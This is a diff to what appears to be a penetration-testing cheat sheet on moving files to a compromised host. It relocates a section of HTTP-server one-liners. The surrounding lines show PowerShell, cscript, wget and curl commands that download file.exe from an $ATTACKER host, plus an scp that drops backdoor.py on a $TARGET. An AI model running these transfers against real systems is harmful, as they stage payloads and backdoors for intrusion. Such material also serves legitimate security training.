@@ -153,6 +153,16 @@ echo bye>>ftp-commands.txt
 ftp -s:ftp-commands.txt
 ```
 
+##### Setting up Simple HTTP server
+
+```bash
+# Linux
+python -m SimpleHTTPServer 80
+python3 -m http.server
+ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
+php -S 0.0.0.0:80
+```
+
 ###### HTTP: Poweshell
 ```PowerShell
 powershell.exe -Command "& {(New-Object Net.WebClient).DownloadFile('http://$ATTACKER/file.exe', 'C:\file.exe')}"
@@ -169,16 +179,6 @@ cscript wget-cscript http://$ATTACKER/file.exe localfile.exe
 wget http://$ATTACKER/file
 curl http://$ATTACKER/file
 scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
-```
-
-###### Setting up Simple HTTP server
-
-```bash
-# Linux
-python -m SimpleHTTPServer 80
-python3 -m http.server
-ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
-php -S 0.0.0.0:80
 ```
 
 
